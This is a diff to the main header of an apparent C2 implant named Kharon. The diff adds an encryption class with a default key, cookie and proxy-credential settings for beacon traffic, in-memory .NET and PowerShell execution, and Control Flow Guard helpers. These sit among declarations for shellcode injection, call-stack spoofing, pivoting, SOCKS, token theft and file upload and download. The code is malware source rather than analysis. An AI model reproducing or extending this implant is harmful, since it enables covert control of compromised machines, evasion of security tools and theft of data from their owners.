@@ -14,6 +14,13 @@ namespace mscorlib {
     #include <Mscoree.hh>
 }
 
+typedef mscorlib::_PropertyInfo IPropertyInfo;
+typedef mscorlib::_AppDomain    IAppDomain;
+typedef mscorlib::_Assembly     IAssembly;
+typedef mscorlib::_Type         IType;
+typedef mscorlib::_MethodInfo   IMethodInfo;
+typedef mscorlib::BindingFlags  IBindingFlags;
+
 #include <Clr.h>
 
 #ifdef   WEB_WINHTTP
@@ -97,6 +104,10 @@ EXTERN_C UPTR EndPtr();
 #define KH_INJECTION_SC ScClassic
 #endif // KH_INJECTION_SC
 
+#ifndef KH_CRYPT_KEY
+#define KH_CRYPT_KEY { 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50 }
+#endif
+
 #ifndef KH_HEAP_MASK
 #define KH_HEAP_MASK FALSE
 #endif // KH_HEAP_MASK
@@ -137,6 +148,14 @@ EXTERN_C UPTR EndPtr();
 #define WEB_SECURE_ENABLED TRUE
 #endif // WEB_SECURE_ENABLED
 
+#ifndef WEB_HTTP_COOKIES_QTT
+#define WEB_HTTP_COOKIES_QTT 0
+#endif // WEB_HTTP_COOKIES_QTT
+
+#ifndef WEB_HTTP_COOKIES
+#define WEB_HTTP_COOKIES {}
+#endif // WEB_HTTP_COOKIES
+
 #ifndef WEB_PROXY_ENABLED
 #define WEB_PROXY_ENABLED FALSE
 #endif // WEB_PROXY_ENABLED
@@ -145,6 +164,15 @@ EXTERN_C UPTR EndPtr();
 #define WEB_PROXY_URL L""
 #endif // WEB_PROXY_URL
 
+#ifndef WEB_PROXY_USERNAME
+#define WEB_PROXY_USERNAME L""
+#endif // WEB_PROXY_USERNAME
+
+#ifndef WEB_PROXY_PASSWORD
+#define WEB_PROXY_PASSWORD L""
+#endif // WEB_PROXY_PASSWORD
+
+class Crypt;
 class Pivot;
 class Coff;
 class Beacon;
@@ -193,12 +221,13 @@ typedef struct JOBS {
     PCHAR    UUID;
     ULONG    CmdID;
     struct JOBS* Next;  
-} JOBS, *PJOBS;
+} JOBS;
 
 namespace Root {
 
     class Kharon {    
     public:
+        Crypt*     Crp; 
         Pivot*     Pvt;
         Beacon*    Bc;
         Coff*      Cf;
@@ -300,6 +329,7 @@ namespace Root {
         struct {
             UPTR Handle;
 
+            DECLAPI( getsockopt );
             DECLAPI( gethostbyname );
             DECLAPI( WSAGetLastError );
             DECLAPI( inet_ntoa );
@@ -321,6 +351,7 @@ namespace Root {
             DECLAPI( ioctlsocket );
             DECLAPI( freeaddrinfo );
         } Ws2_32 = {
+            RSL_TYPE( getsockopt ),
             RSL_TYPE( gethostbyname ),
             RSL_TYPE( WSAGetLastError ),
             RSL_TYPE( inet_ntoa ),
@@ -345,6 +376,8 @@ namespace Root {
 
         struct {
             UPTR Handle;
+
+            DECLAPI( StringCchPrintfW );
     
             DECLAPI( FreeLibrary );
             DECLAPI( LoadLibraryA ); 
@@ -357,6 +390,8 @@ namespace Root {
             DECLAPI( GetModuleFileNameW );
 
             DECLAPI( GetSystemTime );
+
+            DECLAPI( GetTickCount );
 
             DECLAPI( CreateTimerQueueTimer );
 
@@ -446,6 +481,8 @@ namespace Root {
             DECLAPI( UpdateProcThreadAttribute );
             DECLAPI( DeleteProcThreadAttributeList );
         } Krnl32 = {
+            RSL_TYPE( StringCchPrintfW ),
+            
             RSL_TYPE( FreeLibrary ),
             RSL_TYPE( LoadLibraryA ),
             RSL_TYPE( LoadLibraryW ),
@@ -457,6 +494,8 @@ namespace Root {
             RSL_TYPE( GetModuleFileNameW ),
 
             RSL_TYPE( GetSystemTime ),
+
+            RSL_TYPE( GetTickCount ),
 
             RSL_TYPE( CreateTimerQueueTimer ),
 
@@ -708,16 +747,24 @@ namespace Root {
 
             DECLAPI( VariantClear );
             DECLAPI( VariantInit );
+            DECLAPI( SafeArrayAccessData );
+            DECLAPI( SafeArrayGetLBound );
+            DECLAPI( SafeArrayGetUBound );
             DECLAPI( SafeArrayCreateVector );
             DECLAPI( SafeArrayCreate );
+            DECLAPI( SysFreeString );
             DECLAPI( SysAllocString );
             DECLAPI( SafeArrayPutElement );
             DECLAPI( SafeArrayDestroy );
         } Oleaut32 = {
             RSL_TYPE( VariantClear ),
             RSL_TYPE( VariantInit ),
+            RSL_TYPE( SafeArrayAccessData ),
+            RSL_TYPE( SafeArrayGetLBound ),
+            RSL_TYPE( SafeArrayGetUBound ),
             RSL_TYPE( SafeArrayCreateVector ),
             RSL_TYPE( SafeArrayCreate ),
+            RSL_TYPE( SysFreeString ),
             RSL_TYPE( SysAllocString ),
             RSL_TYPE( SafeArrayPutElement ),
             RSL_TYPE( SafeArrayDestroy ),
@@ -819,6 +866,7 @@ namespace Root {
             _In_ UPTR Argument
         ) -> VOID;
 
+        VOID InitCrypt( Crypt* CryptRf ) { Crp = CryptRf; }
         VOID InitCoff( Coff* CoffRf ) { Cf = CoffRf; }
         VOID InitHwbp( HwbpEng* HwbpRf ) { Hw = HwbpRf; }
         VOID InitSpoof( Spoof* SpoofRf ) { Spf = SpoofRf; }
@@ -874,8 +922,47 @@ struct _CLR_CTX {
 };
 
 typedef _CLR_CTX CLR_CTX;
-
 typedef _LOAD_CTX LOAD_CTX;
+
+enum _LOKY_CRYPT {
+    LokyEnc,
+    LokyDec
+};
+typedef _LOKY_CRYPT LOKY_CRYPT;
+
+class Crypt {
+private:
+    Root::Kharon* Self;    
+public:
+    Crypt( Root::Kharon* KharonRf ) : Self( KharonRf ) {}
+
+    UCHAR Key[16] = KH_CRYPT_KEY;
+
+    auto Cycle( 
+        BYTE* Block, 
+        LOKY_CRYPT Loky 
+    ) -> VOID;
+
+    auto AddPadding( 
+        UCHAR** Block, 
+        ULONG*  Length 
+    ) -> VOID;
+
+    auto RmPadding( 
+        UCHAR* Block, 
+        ULONG* Length 
+    ) -> VOID;
+
+    auto Encrypt( 
+        UCHAR** Block, 
+        ULONG*  Length
+    ) -> VOID;
+
+    auto Decrypt( 
+        UCHAR* Block, 
+        ULONG* Length
+    ) -> VOID;
+};
 
 class Spoof {
 private:
@@ -961,14 +1048,11 @@ public:
     //     UPTR Hash;
     //     UPTR Ptr;
     // } HookTable[10] = {
-    //     HookTable[0] = { Hsh::Str( "VirtualAlloc" ), (UPTR)Self->Mm->Alloc },
-    //     HookTable[0] = { Hsh::Str( "VirtualAlloc" ), (UPTR)Self->Krnl32.VirtualAllocEx },
-    //     HookTable[0] = { Hsh::Str( "VirtualAlloc" ), (UPTR)Self->Krnl32.VirtualProtect },
-    //     HookTable[0] = { Hsh::Str( "VirtualAlloc" ), (UPTR)Self->Krnl32.VirtualProtectEx },
-    //     HookTable[0] = { Hsh::Str( "VirtualAlloc" ), (UPTR)Self->Krnl32.WriteProcessMemory },
-    //     HookTable[0] = { Hsh::Str( "VirtualAlloc" ), (UPTR)Self->Krnl32.ReadProcessMemory },
-    //     HookTable[0] = { Hsh::Str( "VirtualAlloc" ), (UPTR)Self->Krnl32.LoadLibraryA },
-    //     HookTable[0] = { Hsh::Str( "VirtualAlloc" ), (UPTR)Self->Krnl32.VirtualAlloc },
+    //     HookTable[0] = { Hsh::Str( "VirtualAlloc" ),       (UPTR)&Self->Mm->Alloc },
+    //     HookTable[1] = { Hsh::Str( "VirtualProtect" ),     (UPTR)&Self->Mm->Protect },
+    //     HookTable[2] = { Hsh::Str( "WriteProcessMemory" ), (UPTR)&Self->Mm->Write },
+    //     HookTable[3] = { Hsh::Str( "ReadProcessMemory" ),  (UPTR)&Self->Mm->Read },
+    //     HookTable[4] = { Hsh::Str( "LoadLibraryA" ),       (UPTR)&Self->Lib->Load },
     // };
 
     struct {
@@ -1444,12 +1528,14 @@ public:
     };
 
     struct {
+        IID MscorlibAsm;
         IID IHostControl;
         IID AppDomain;
         IID ICLRMetaHost;
         IID ICLRRuntimeInfo;
         IID ICorRuntimeHost;
     } IID = {
+        .MscorlibAsm      = { 0x17156360, 0x2F1A, 0x384A, { 0xBC, 0x52, 0xFD, 0xE9, 0x3C, 0x21, 0x5C, 0x5B } },
         .IHostControl     = { 0x02CA073C, 0x7079, 0x4860, { 0x88, 0x0A, 0xC2, 0xF7, 0xA4, 0x49, 0xC9, 0x91 } },
         .AppDomain        = { 0x05F696DC, 0x2B29, 0x3663, { 0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13 } },
         .ICLRMetaHost     = { 0xD332DB9E, 0xB9B3, 0x4125, { 0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16 } },
@@ -1472,6 +1558,21 @@ public:
     } Invoke[5] = {};
 
     BOOL KeepLoad = FALSE;
+    BOOL ExitBp   = TRUE;
+
+    auto GetAssemblyLoaded(
+        _In_  IAppDomain* AppDomain,
+        _In_  WCHAR*      AsmName1,
+        _In_  GUID        AsmIID, 
+        _Out_ IAssembly** Assembly
+    ) -> HRESULT;
+
+    auto GetMethodType(
+        _In_  IBindingFlags Flags,
+        _In_  IType*        MType,
+        _In_  BSTR          MethodInp,
+        _Out_ IMethodInfo** MethodRef
+    ) -> HRESULT;
 
     auto PatchExit(
         _In_ ICorRuntimeHost* IRuntime
@@ -1487,6 +1588,11 @@ public:
         _In_ PWSTR Version,
         _In_ BOOL  KeepLoad
     ) -> BOOL;
+
+    auto Pwsh(
+        _In_     WCHAR* Command,
+        _In_opt_ PBYTE  Script
+    ) -> HRESULT;
 };
 
 class Useful {
@@ -1501,6 +1607,19 @@ public:
         _In_     BYTE*  Key, 
         _In_     SIZE_T KeySize 
     ) -> VOID;
+
+    auto CfgAddrAdd( 
+        _In_ PVOID ImageBase,
+        _In_ PVOID Function
+    ) -> VOID;
+
+    auto CfgPrivAdd(
+        _In_ HANDLE hProcess,
+        _In_ PVOID  Address,
+        _In_ DWORD  Size
+    ) -> VOID;
+
+    auto CfgCheck( VOID ) -> BOOL;
 
     auto FindGadget(
         _In_ UPTR   ModuleBase,
@@ -1737,12 +1856,13 @@ public:
     struct {
         PWCHAR Host;
         ULONG  Port;
-        PWCHAR EndPoint;
-        PWCHAR UserAgent;
-        PWCHAR HttpHeaders;
-        PWCHAR ProxyUrl;
-        PWCHAR ProxyUsername;
-        PWCHAR ProxyPassword;
+        WCHAR* EndPoint;
+        WCHAR* UserAgent;
+        WCHAR* HttpHeaders;
+        WCHAR* Cookies[WEB_HTTP_COOKIES_QTT];
+        WCHAR* ProxyUrl;
+        WCHAR* ProxyUsername;
+        WCHAR* ProxyPassword;
         BOOL   ProxyEnabled;
         BOOL   Secure;
     } Web = {
@@ -1751,6 +1871,7 @@ public:
         .EndPoint     = WEB_ENDPOINT,
         .UserAgent    = WEB_USER_AGENT,
         .HttpHeaders  = WEB_HTTP_HEADERS,
+        .Cookies      = WEB_HTTP_COOKIES,
         .ProxyUrl     = WEB_PROXY_URL,
         .ProxyEnabled = WEB_PROXY_ENABLED,
         .Secure       = WEB_SECURE_ENABLED
@@ -1774,7 +1895,6 @@ public:
             .ChunkSize = KH_CHUNK_SIZE
         }
     };
-
 
     struct {
         PVOID  Node;
@@ -1889,62 +2009,62 @@ public:
     ) -> VOID;
 
     auto Token(
-        _In_ PJOBS Job
+        _In_ JOBS* Job
     ) -> ERROR_CODE;
 
     auto Download(
-        _In_ PJOBS Job
+        _In_ JOBS* Job
     ) -> ERROR_CODE;
     
     auto Upload(
-        _In_ PJOBS Job
+        _In_ JOBS* Job
     ) -> ERROR_CODE;
 
     auto Pivot( 
-        _In_ PJOBS Job
+        _In_ JOBS* Job
     ) -> ERROR_CODE;
 
     auto Socks( 
-        _In_ PJOBS Job
+        _In_ JOBS* Job
     ) -> ERROR_CODE;
 
     auto Config( 
-        _In_ PJOBS Job
+        _In_ JOBS* Job
     ) -> ERROR_CODE;
 
     auto ExecPE( 
-        _In_ PJOBS Job
+        _In_ JOBS* Job
     ) -> ERROR_CODE;
 
     auto ExecSc( 
-        _In_ PJOBS Job
+        _In_ JOBS* Job
     ) -> ERROR_CODE;
 
     auto Process( 
-        _In_ PJOBS Job
+        _In_ JOBS* Job
     ) -> ERROR_CODE;
 
     auto FileSystem( 
-        _In_ PJOBS Job
+        _In_ JOBS* Job
     ) -> ERROR_CODE;
 
     auto Dotnet(
-        _In_ PJOBS Job
+        _In_ JOBS* Job
     ) -> ERROR_CODE;
 
     auto ExecBof(
-        _In_ PJOBS Job
+        _In_ JOBS* Job
     ) -> ERROR_CODE;
 
     auto Exit(
-        _In_ PJOBS Job
+        _In_ JOBS* Job
     ) -> ERROR_CODE;
 
-    typedef auto ( Task::*TASK_FUNC )( PJOBS ) -> ERROR_CODE;
+    typedef auto ( Task::*TASK_FUNC )( JOBS* ) -> ERROR_CODE;
 
     struct {
         ULONG        ID;
-        ERROR_CODE ( Task::*Run )( PJOBS );
+        ERROR_CODE ( Task::*Run )( JOBS* );
     } Mgmt[TSK_LENGTH] = {
         Mgmt[0].ID = TskExit,       Mgmt[0].Run = &Task::Exit,
         Mgmt[1].ID = TskFileSystem, Mgmt[1].Run = &Task::FileSystem,
@@ -2057,7 +2177,7 @@ private:
 public:
     Library( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
-    auto Load(
+    auto static Load(
         _In_ PCHAR LibName
     ) -> UPTR;
 
@@ -2169,7 +2289,7 @@ private:
 public:
     Memory( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
-    auto Alloc(
+    auto static Alloc(
         _In_ PVOID Base,
         _In_ ULONG Size,
         _In_ ULONG AllocType,
@@ -2177,7 +2297,7 @@ public:
         _In_ HANDLE Handle = nullptr
     ) -> PVOID;
 
-    auto Protect(
+    auto static Protect(
         _In_  PVOID  Base,
         _In_  ULONG  Size,
         _In_  ULONG  NewProt,
@@ -2185,21 +2305,21 @@ public:
         _In_ HANDLE Handle = nullptr
     ) -> BOOL;
 
-    auto Write(
+    auto static Write(
         _In_ PVOID  Base,
         _In_ BYTE*  Buffer,
         _In_ ULONG  Size,
         _In_ HANDLE Handle = nullptr
     ) -> BOOL;
 
-    auto WriteAPC(
+    auto static WriteAPC(
         _In_ HANDLE Handle,
         _In_ PVOID  Base,
         _In_ BYTE*  Buffer,
         _In_ ULONG  Size
     ) -> BOOL;
 
-    auto Read(
+    auto static Read(
         _In_  PVOID   Base,
         _In_  BYTE*   Buffer,
         _In_  SIZE_T  Size,
@@ -2207,14 +2327,14 @@ public:
         _In_ HANDLE Handle = nullptr
     ) -> BOOL;
 
-    auto Free(
+    auto static Free(
         _In_ PVOID  Base,
         _In_ ULONG  Size,
         _In_ ULONG  FreeType,
         _In_ HANDLE Handle = nullptr
     ) -> BOOL;
 
-    auto MapView(
+    auto static MapView(
         _In_        HANDLE          SectionHandle,
         _In_        HANDLE          ProcessHandle,
         _Inout_     PVOID          *BaseAddress,
@@ -2227,7 +2347,7 @@ public:
         _In_        ULONG           PageProtection
     ) -> LONG;
 
-    auto CreateSection(
+    auto static CreateSection(
         _Out_    HANDLE*            SectionHandle,
         _In_     ACCESS_MASK        DesiredAccess,
         _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
